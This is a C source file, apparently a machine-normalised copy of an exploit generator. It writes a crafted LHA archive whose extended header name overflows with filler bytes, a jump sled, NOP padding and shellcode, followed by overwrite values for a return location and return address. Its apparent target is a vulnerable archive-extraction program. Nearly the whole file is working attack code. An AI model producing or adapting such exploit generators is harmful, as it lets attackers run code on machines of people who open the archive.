#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 scalar_t__ DEBUG ; 
 int E_HEADER_NAME ; 
 int E_HEADER_SIZE ; 
 int E_HEADER_TYPE ; 
 int I_ATTRIBUTE ; 
 int I_CRC ; 
 int I_EXTEND_TYPE ; 
 int I_HEADER_CHECKSUM ; 
 int I_HEADER_LEVEL ; 
 int I_HEADER_SIZE ; 
 int I_LAST_MODIFIED_STAMP ; 
 int I_METHOD ; 
 int I_NAME ; 
 int I_NAME_LENGTH ; 
 int I_ORIGINAL_SIZE ; 
 int I_PACKED_SIZE ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fclose (int /*<<< orphan*/ *) ; 
 int fwrite (char*,int,int,int /*<<< orphan*/ *) ; 
 scalar_t__ malloc (int) ; 
 int /*<<< orphan*/  memcpy (char*,char*,int) ; 
 int /*<<< orphan*/  memset (char*,int,int) ; 
 int /*<<< orphan*/ * open_file (char*) ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  printf (char*,int) ; 
 int /*<<< orphan*/  put_byte (char*,int) ; 
 int /*<<< orphan*/  put_longword (char*,unsigned int) ; 
 int /*<<< orphan*/  put_word (char*,int) ; 
 char* shellcode1 ; 
 int /*<<< orphan*/  sscanf (char*,char*,unsigned int*) ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  strncpy (char*,char*,int) ; 
 int /*<<< orphan*/  usage (char*) ; 

int main (int argc, char *argv[]) {

       FILE *fp;
       char *hdr = (char *) malloc (4096), *ptr;
       int header_size;
       int written_bytes;
       int total_size;
       unsigned int retloc, retaddr;
       char *filename = (char *) malloc (256);
       int i;

       if (!hdr) {
               perror ("Error allocating memory");
               exit (-1);
       }

       if ( argc != 4) {
               usage ( argv[0] );
       }

       // parse arguments
       sscanf (argv[1], "0x%x", &retloc);
       sscanf (argv[2], "0x%x", &retaddr);
       strncpy (filename, argv[3], 255);

       memset (hdr, 0, 4096);

       // base header
       header_size = 29;
       put_byte (hdr + I_HEADER_SIZE, header_size);
       put_byte (hdr + I_HEADER_CHECKSUM, 83);
       memcpy (hdr + I_METHOD, "-lh0-", 5); // No compression...
       put_longword (hdr + I_PACKED_SIZE, 0x1234);
       put_longword (hdr + I_ORIGINAL_SIZE, 0x1234);
       put_longword (hdr + I_LAST_MODIFIED_STAMP, 0x1234);
       put_byte (hdr + I_ATTRIBUTE, 0x20);
       put_byte (hdr + I_HEADER_LEVEL, 0x01);
       put_byte (hdr + I_NAME_LENGTH, 0x04);
       put_longword (hdr + I_NAME, 0x90909090);
       put_word (hdr + I_CRC, 0x6666);
       put_byte (hdr + I_EXTEND_TYPE, 0x55); // Unix filesystem.

       // extended header
       put_word (hdr + header_size + E_HEADER_SIZE, 285);
       put_byte (hdr + header_size + E_HEADER_TYPE, 0x2);

       // Build our payload
       memset (hdr + header_size + E_HEADER_NAME, 0x41, 266);
       for (i = 0, ptr = hdr + header_size + E_HEADER_NAME; i < (240
       - strlen (shellcode1) - 10);) {
               ptr[i++] = 0xeb;
               ptr[i++] = 0x0a;
       }
       for (; i < (240 - strlen (shellcode1));) {
               ptr[i++]=0x90;
       }
       memcpy (hdr + header_size + E_HEADER_NAME + 240 - strlen
       (shellcode1), shellcode1, strlen(shellcode1));

       put_longword (hdr + header_size + E_HEADER_NAME + 266,
       0x41414141);
       put_longword (hdr + header_size + E_HEADER_NAME + 270,
       0xB7E34CC2);
       put_longword (hdr + header_size + E_HEADER_NAME + 274, retloc
       - 0xc);
       put_longword (hdr + header_size + E_HEADER_NAME + 278,
       retaddr);

       // Size of next extended header is 0
       put_word (hdr + header_size + E_HEADER_NAME + 282, 0x0000);

       total_size = (header_size + 284 + E_HEADER_NAME);

       fp = open_file (filename);

       if ( (written_bytes = fwrite ( hdr, 1, total_size, fp)) != 0 )
       {
               if (DEBUG) printf ("%d bytes written\n",
               written_bytes);
       } else {
               perror ("Cant write to the file\n");
       }

       fclose (fp);

       return 0;
}